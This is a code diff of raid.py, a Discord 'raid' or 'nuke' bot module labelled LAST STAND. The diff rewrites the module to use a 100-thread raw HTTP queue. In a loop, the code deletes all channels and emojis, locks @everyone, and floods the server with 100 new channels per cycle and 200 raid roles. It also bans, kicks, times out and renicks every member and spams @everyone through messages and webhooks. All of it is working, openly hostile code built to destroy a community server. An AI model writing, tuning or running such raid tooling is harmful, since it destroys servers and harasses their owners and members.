@@ -1,19 +1,15 @@
 """
 raid.py — LAST STAND | Raw destruction engine.
+All delete/create/ban/kick/emoji/role operations use the 100-thread raw HTTP queue
+(c-realV2.py port). Continuous channel spam stays async to keep heartbeat alive.
 
 PHASES (all run concurrently from _launch):
-  _rename_server    — rename + lock @everyone
-  _wipe_assets      — remove icon, banner, description, stickers
-  _wipe_emojis      — delete all custom emojis
-  _channel_loop     — concurrent delete → concurrent create → webhook boost
-  _role_flood       — create 200 raid roles
-  _member_ops       — ban + kick + timeout + nick all members
-
-CHANNEL LOOP DETAIL:
-  Phase 1: delete all channels concurrently (sem=20)
-  Phase 2: 3 concurrent creator workers filling up to the 500-channel cap
-  Phase 3: webhook phase — add 1 webhook per channel for extra spam volume
-           (direct channel.send spam already running from Phase 2)
+  _rename_server  — rename + lock @everyone
+  _wipe_assets    — remove icon, banner, description, stickers
+  _wipe_emojis    — DELETE all custom emojis via queue
+  _channel_loop   — queue delete all → queue create 100 → async spam → repeat
+  _role_flood     — queue POST 200 raid roles
+  _member_ops     — queue kick + ban + timeout + nick all members
 """
 
 import asyncio
@@ -22,9 +18,11 @@ import random
 import string
 
 import discord
+import requests
 from discord import app_commands
 from discord.ext import commands
 
+from utils.http_queue import HttpQueue, API_BASE
 from utils.state import bot_state
 
 RAID_TAG    = "LAST STAND"
@@ -33,20 +31,12 @@ RAID_NAME   = "RAIDED BY JEAN(LORENZO) FROM LAST STAND"
 RAIDER      = "JEAN(LORENZO)"
 RAID_GIF    = "https://cdn.discordapp.com/attachments/827289915388985404/1493954462580998236/EllenJoe.gif"
 
-CHANNEL_CAP      = 490
-CREATORS         = 5
-ROLE_FLOOD_MAX   = 200
-SPAM_BURST       = 3    # messages per semaphore slot (3 × 25 slots = 75 concurrent channel sends)
-CREATE_PER_CYCLE = 100  # channels built per nuke cycle (100 ch × 5 msg/s = 500/s = 30k/min)
-WEBHOOKS_PER_CH  = 2    # 2 webhooks per channel — when one hits 429, other fires
+CREATE_PER_CYCLE = 100
+WEBHOOKS_PER_CH  = 2
+SPAM_BURST       = 3
 
-# Hard caps on concurrent HTTP requests.
-# Without these, 200 unconstrained webhook tasks + 100 channel tasks = 1500 concurrent
-# HTTP requests → event loop starvation → Discord heartbeat dies → bot disconnects →
-# every slash command shows "Application did not respond".
-# With these: 25×3 + 15×3 = 120 max concurrent requests — heartbeat always gets scheduled.
-_SPAM_SEM = asyncio.Semaphore(25)   # controls channel.send tasks
-_WH_SEM   = asyncio.Semaphore(15)   # controls wh.send tasks (was defined but never used — root cause)
+_SPAM_SEM = asyncio.Semaphore(25)
+_WH_SEM   = asyncio.Semaphore(15)
 
 _MSGS = [
     f"@everyone 💀 **{RAID_NAME}** 💀 {RAID_LINK}",
@@ -80,20 +70,26 @@ _ROLE_NAMES = [
 
 _NICKS = ["RAIDED", "LS Was Here", "GG no re", "PWNED", "JEAN(LORENZO)", RAID_TAG]
 
+_CH_OPTS = [
+    "raided-by-ls-{i}",
+    "last-stand-{i}",
+    "ls-owned-{i}",
+    "ls-raid-{i}",
+    "jean-lorenzo-{i}",
+]
+
+_ROLE_COLORS = [
+    0xFF0000, 0x8B0000, 0xFF6600, 0xFF4500,
+    0x800080, 0x4B0082, 0xFF1493, 0xDC143C,
+]
+
 
 def _rand(n: int = 4) -> str:
     return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))
 
 
 def _ch_name(i: int = 0) -> str:
-    opts = [
-        f"raided-by-ls-{i}",
-        f"last-stand-{i}",
-        f"ls-owned-{i}",
-        f"ls-raid-{i}",
-        f"jean-lorenzo-{i}",
-    ]
-    return random.choice(opts)
+    return random.choice(_CH_OPTS).format(i=i)
 
 
 def _msg() -> str:
@@ -152,16 +148,16 @@ class Raid(commands.Cog):
                 pass
         except asyncio.TimeoutError:
             await interaction.followup.send(
-                f"❌ **TIMEOUT — create_text_channel hung 15s.**\n"
-                f"• Guild may be at 500-channel cap\n"
-                f"• Discord rate-limiting this guild (wait 10–15 min)\n"
-                f"• Redeploy on Railway to reset connection",
+                "❌ **TIMEOUT** — create_text_channel hung 15s.\n"
+                "• Guild at 500-channel cap\n"
+                "• Discord rate-limiting this guild (wait 10–15 min)\n"
+                "• Redeploy on Railway to reset connection",
                 ephemeral=True,
             )
         except discord.Forbidden as e:
-            await interaction.followup.send(f"❌ **403 FORBIDDEN** — `{e}`\nFix: enable **Manage Channels** on bot role.", ephemeral=True)
+            await interaction.followup.send(f"❌ **403 FORBIDDEN** — `{e}`", ephemeral=True)
         except discord.HTTPException as e:
-            await interaction.followup.send(f"❌ **HTTP {e.status}** — code `{e.code}`: `{e.text}`", ephemeral=True)
+            await interaction.followup.send(f"❌ **HTTP {e.status}** — `{e.text}`", ephemeral=True)
         except Exception as e:
             await interaction.followup.send(f"❌ `{type(e).__name__}: {e}`", ephemeral=True)
 
@@ -181,8 +177,11 @@ class Raid(commands.Cog):
         try:
             await reply(
                 f"☠️ **{RAID_TAG} — RAID LAUNCHED** ☠️\n"
-                f"┣ CONTINUOUS NUKE: delete all → rebuild {CREATE_PER_CYCLE} → spam → repeat\n"
-                f"┣ Role flood (200 roles) + member ban/kick/timeout\n"
+                f"┣ ENGINE: 100-thread raw HTTP queue (c-realV2 system)\n"
+                f"┣ DELETE all channels + roles + emojis simultaneously\n"
+                f"┣ REBUILD {CREATE_PER_CYCLE} flood channels + 200 raid roles\n"
+                f"┣ BAN + KICK + TIMEOUT all members at once\n"
+                f"┣ SPAM every channel (direct + webhooks) — loops forever\n"
                 f"┗ `/stop` or `.stop` to halt."
             )
         except Exception:
@@ -226,7 +225,7 @@ class Raid(commands.Cog):
             print(f"[raid] lock @everyone FAILED: {e}", flush=True)
 
     # ─────────────────────────────────────────────────────────────────────────
-    # WIPE SERVER ASSETS — icon, banner, description, stickers
+    # WIPE SERVER ASSETS
     # ─────────────────────────────────────────────────────────────────────────
     async def _wipe_assets(self, guild: discord.Guild) -> None:
         try:
@@ -246,96 +245,86 @@ class Raid(commands.Cog):
                 pass
 
     # ─────────────────────────────────────────────────────────────────────────
+    # EMOJI WIPE — queue DELETE for every custom emoji simultaneously
+    # ─────────────────────────────────────────────────────────────────────────
+    async def _wipe_emojis(self, guild: discord.Guild) -> None:
+        q = HttpQueue.get()
+        emojis = list(guild.emojis)
+        if not emojis:
+            return
+        for e in emojis:
+            q.put(requests.delete, f"{API_BASE}/guilds/{guild.id}/emojis/{e.id}")
+        await q.join()
+        print(f"[raid] wiped {len(emojis)} emojis", flush=True)
+
+    # ─────────────────────────────────────────────────────────────────────────
     # CONTINUOUS NUKE LOOP
-    #   Repeats forever until /stop:
-    #     1. Delete ALL channels concurrently (sem=40)
-    #     2. Create 50 flood channels (5 concurrent workers)
-    #     3. Spam every new channel immediately (direct + webhook)
-    #     4. Go back to step 1 — nuke everything and rebuild again
-    #
-    #   Spam tasks from the previous cycle die naturally on NotFound when
-    #   channels are deleted. New ones spawn fresh each cycle.
+    #   1. Queue DELETE all channels → join
+    #   2. Queue POST 100 new channels → join
+    #   3. Async spam every channel (direct + webhooks)
+    #   4. Short pause, then repeat
     # ─────────────────────────────────────────────────────────────────────────
     async def _channel_loop(self, guild: discord.Guild) -> None:
-        se  = bot_state.stop_event
-        del_sem = asyncio.Semaphore(40)
-        cycle   = 0
-
-        async def _del(ch: discord.abc.GuildChannel) -> None:
-            async with del_sem:
-                try:
-                    await ch.delete()
-                except discord.NotFound:
-                    pass
-                except discord.Forbidden:
-                    pass
-                except discord.HTTPException as e:
-                    if e.status == 429:
-                        await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
-                except Exception:
-                    pass
+        se    = bot_state.stop_event
+        q     = HttpQueue.get()
+        cycle = 0
 
         try:
             while not se.is_set():
                 cycle += 1
-                # ── delete everything ─────────────────────────────────────────
+
+                # ── DELETE all channels via 100-thread queue ───────────────
                 existing = list(guild.channels)
-                print(f"[nuke] cycle {cycle} — deleting {len(existing)} channels", flush=True)
-                await asyncio.gather(*[_del(ch) for ch in existing], return_exceptions=True)
+                print(f"[nuke] cycle {cycle} — queuing {len(existing)} deletes", flush=True)
+                for ch in existing:
+                    q.put(requests.delete, f"{API_BASE}/channels/{ch.id}")
+                await q.join()
 
                 if se.is_set():
                     break
 
-                # ── rebuild 50 flood channels ─────────────────────────────────
-                created: list[discord.TextChannel] = []
-                lock = asyncio.Lock()
+                # let gateway deliver CHANNEL_DELETE events
+                await asyncio.sleep(1.5)
 
-                async def _creator(start: int, step: int) -> None:
-                    i = start
-                    while not se.is_set():
-                        async with lock:
-                            n = len(created)
-                        if n >= CREATE_PER_CYCLE:
-                            break
-                        name = _ch_name(i + cycle * 1000)
-                        try:
-                            ch = await asyncio.wait_for(
-                                guild.create_text_channel(
-                                    name,
-                                    topic=f"RAIDED BY {RAID_TAG} | {RAID_LINK}",
-                                ),
-                                timeout=15.0,
-                            )
-                            async with lock:
-                                created.append(ch)
-                            print(f"[nuke] cycle {cycle} created #{name} ({len(created)})", flush=True)
-                            bot_state.add_task(asyncio.create_task(self._spam_channel(ch)))
-                            for _ in range(WEBHOOKS_PER_CH):
-                                bot_state.add_task(asyncio.create_task(self._add_webhook(ch)))
-                        except asyncio.TimeoutError:
-                            await asyncio.sleep(5.0)
-                        except discord.Forbidden:
-                            await asyncio.sleep(2.0)
-                        except discord.HTTPException as e:
-                            if e.status == 429:
-                                await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
-                            else:
-                                await asyncio.sleep(1.0)
-                        except Exception:
-                            await asyncio.sleep(1.0)
-                        i += step
+                # ── CREATE 100 flood channels via 100-thread queue ─────────
+                print(f"[nuke] cycle {cycle} — queuing {CREATE_PER_CYCLE} creates", flush=True)
+                for i in range(CREATE_PER_CYCLE):
+                    if se.is_set():
+                        break
+                    q.put(
+                        requests.post,
+                        f"{API_BASE}/guilds/{guild.id}/channels",
+                        {
+                            "name": _ch_name(i + cycle * 1000),
+                            "type": 0,
+                            "topic": f"RAIDED BY {RAID_TAG} | {RAID_LINK}",
+                        },
+                    )
 
-                await asyncio.gather(
-                    _creator(0, CREATORS),
-                    _creator(1, CREATORS),
-                    _creator(2, CREATORS),
-                    _creator(3, CREATORS),
-                    _creator(4, CREATORS),
-                    return_exceptions=True,
-                )
-                print(f"[nuke] cycle {cycle} built {len(created)} channels — looping back", flush=True)
+                if not se.is_set():
+                    await q.join()
+
+                if se.is_set():
+                    break
+
+                # let gateway deliver CHANNEL_CREATE events
+                await asyncio.sleep(2.0)
+
+                # ── start spam tasks on every fresh channel ────────────────
+                for ch in list(guild.text_channels):
+                    if se.is_set():
+                        break
+                    bot_state.add_task(asyncio.create_task(self._spam_channel(ch)))
+                    for _ in range(WEBHOOKS_PER_CH):
+                        bot_state.add_task(asyncio.create_task(self._add_webhook(ch)))
+
+                print(f"[nuke] cycle {cycle} — spam launched on {len(guild.text_channels)} channels", flush=True)
+
+                # hold spam running for a few seconds before next nuke cycle
+                await asyncio.sleep(8.0)
 
         except asyncio.CancelledError:
+            q.clear()
             print("[nuke] channel_loop cancelled", flush=True)
         except Exception as e:
             print(f"[nuke] channel_loop CRASH: {type(e).__name__}: {e}", flush=True)
@@ -343,7 +332,7 @@ class Raid(commands.Cog):
             print("[nuke] channel_loop exiting", flush=True)
 
     # ─────────────────────────────────────────────────────────────────────────
-    # ADD WEBHOOK — called per channel immediately at creation time
+    # ADD WEBHOOK
     # ─────────────────────────────────────────────────────────────────────────
     async def _add_webhook(self, channel: discord.TextChannel) -> None:
         se = bot_state.stop_event
@@ -367,10 +356,10 @@ class Raid(commands.Cog):
                 pass
 
     # ─────────────────────────────────────────────────────────────────────────
-    # DIRECT CHANNEL SPAM — starts immediately when a channel is created
+    # DIRECT CHANNEL SPAM
     # ─────────────────────────────────────────────────────────────────────────
     async def _spam_channel(self, channel: discord.TextChannel) -> None:
-        se = bot_state.stop_event
+        se       = bot_state.stop_event
         mentions = discord.AllowedMentions(everyone=True, roles=True)
 
         while not se.is_set():
@@ -391,20 +380,17 @@ class Raid(commands.Cog):
                     return
                 except Exception:
                     return
-            # Yield to event loop so Discord gateway heartbeats can get through.
-            # Without this, 490+ tight-looping tasks starve the event loop,
-            # heartbeat times out, bot disconnects, all commands fail.
             await asyncio.sleep(0.1)
 
     # ─────────────────────────────────────────────────────────────────────────
-    # WEBHOOK SPAM — additional volume on top of direct sends
+    # WEBHOOK SPAM
     # ─────────────────────────────────────────────────────────────────────────
     async def _spam_webhook(self, wh: discord.Webhook) -> None:
-        se = bot_state.stop_event
+        se       = bot_state.stop_event
         mentions = discord.AllowedMentions(everyone=True, roles=True)
 
         while not se.is_set():
-            async with _WH_SEM:   # ← was missing — this was the "Application did not respond" root cause
+            async with _WH_SEM:
                 if se.is_set():
                     return
                 try:
@@ -425,44 +411,32 @@ class Raid(commands.Cog):
             await asyncio.sleep(0.1)
 
     # ─────────────────────────────────────────────────────────────────────────
-    # ROLE FLOOD — create 200 raid roles concurrently
+    # ROLE FLOOD — queue POST 200 raid roles simultaneously
     # ─────────────────────────────────────────────────────────────────────────
     async def _role_flood(self, guild: discord.Guild) -> None:
+        q  = HttpQueue.get()
         se = bot_state.stop_event
-        sem = asyncio.Semaphore(25)
-        colors = [
-            discord.Color.red(), discord.Color.dark_red(), discord.Color.orange(),
-            discord.Color.dark_orange(), discord.Color.purple(), discord.Color.dark_purple(),
-        ]
 
-        async def _make_role(i: int) -> None:
+        for i in range(200):
             if se.is_set():
-                return
-            async with sem:
-                try:
-                    name = f"{random.choice(_ROLE_NAMES)} {i}"
-                    await guild.create_role(
-                        name=name,
-                        color=random.choice(colors),
-                        reason=f"Raided by {RAID_TAG}",
-                    )
-                    print(f"[role] created role #{i}", flush=True)
-                except discord.Forbidden:
-                    pass
-                except discord.HTTPException as e:
-                    if e.status == 429:
-                        await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
-                except Exception:
-                    pass
+                break
+            q.put(
+                requests.post,
+                f"{API_BASE}/guilds/{guild.id}/roles",
+                {
+                    "name": f"{random.choice(_ROLE_NAMES)} {i}",
+                    "color": random.choice(_ROLE_COLORS),
+                    "permissions": "0",
+                },
+            )
 
-        await asyncio.gather(
-            *[_make_role(i) for i in range(ROLE_FLOOD_MAX)],
-            return_exceptions=True,
-        )
-        print(f"[role] role flood done", flush=True)
+        if not se.is_set():
+            await q.join()
+
+        print("[role] role flood done", flush=True)
 
     # ─────────────────────────────────────────────────────────────────────────
-    # MEMBER OPS — ban + kick + timeout + nick
+    # MEMBER OPS — queue kick + ban + timeout + nick for all members at once
     # ─────────────────────────────────────────────────────────────────────────
     async def _member_ops(self, guild: discord.Guild, invoker_id: int) -> None:
         se = bot_state.stop_event
@@ -484,62 +458,38 @@ class Raid(commands.Cog):
             and m.id != me.id
             and m.top_role < me.top_role
         ]
-        print(f"[raid] banning/kicking {len(targets)} members", flush=True)
+        print(f"[raid] queuing ops on {len(targets)} members", flush=True)
 
-        sem = asyncio.Semaphore(50)
-        dur = datetime.timedelta(days=28)
+        q = HttpQueue.get()
+        timeout_until = (
+            datetime.datetime.utcnow() + datetime.timedelta(days=28)
+        ).strftime("%Y-%m-%dT%H:%M:%S.000Z")
 
-        async def _ban(m):
-            async with sem:
-                try:
-                    await guild.ban(m, reason=f"Raided by {RAID_TAG}", delete_message_days=0)
-                except Exception:
-                    pass
+        for m in targets:
+            if se.is_set():
+                break
+            # kick
+            q.put(requests.delete, f"{API_BASE}/guilds/{guild.id}/members/{m.id}")
+            # ban
+            q.put(
+                requests.put,
+                f"{API_BASE}/guilds/{guild.id}/bans/{m.id}",
+                {"delete_message_days": 0},
+            )
+            # timeout + nick in one PATCH
+            q.put(
+                requests.patch,
+                f"{API_BASE}/guilds/{guild.id}/members/{m.id}",
+                {
+                    "communication_disabled_until": timeout_until,
+                    "nick": random.choice(_NICKS),
+                },
+            )
 
-        async def _kick(m):
-            async with sem:
-                try:
-                    await guild.kick(m, reason=f"Raided by {RAID_TAG}")
-                except Exception:
-                    pass
+        if not se.is_set():
+            await q.join()
 
-        async def _timeout(m):
-            async with sem:
-                try:
-                    await m.timeout(dur, reason=f"Raided by {RAID_TAG}")
-                except Exception:
-                    pass
-
-        async def _nick(m):
-            async with sem:
-                try:
-                    await m.edit(nick=random.choice(_NICKS))
-                except Exception:
-                    pass
-
-        await asyncio.gather(
-            *[_ban(m) for m in targets],
-            *[_kick(m) for m in targets],
-            *[_timeout(m) for m in targets],
-            *[_nick(m) for m in targets],
-            return_exceptions=True,
-        )
         print("[raid] member_ops done", flush=True)
-
-    # ─────────────────────────────────────────────────────────────────────────
-    # EMOJI WIPE
-    # ─────────────────────────────────────────────────────────────────────────
-    async def _wipe_emojis(self, guild: discord.Guild) -> None:
-        sem = asyncio.Semaphore(10)
-
-        async def _del_emoji(e):
-            async with sem:
-                try:
-                    await e.delete()
-                except Exception:
-                    pass
-
-        await asyncio.gather(*[_del_emoji(e) for e in list(guild.emojis)], return_exceptions=True)
 
     # ── error handlers ─────────────────────────────────────────────────────────
     @raid.error
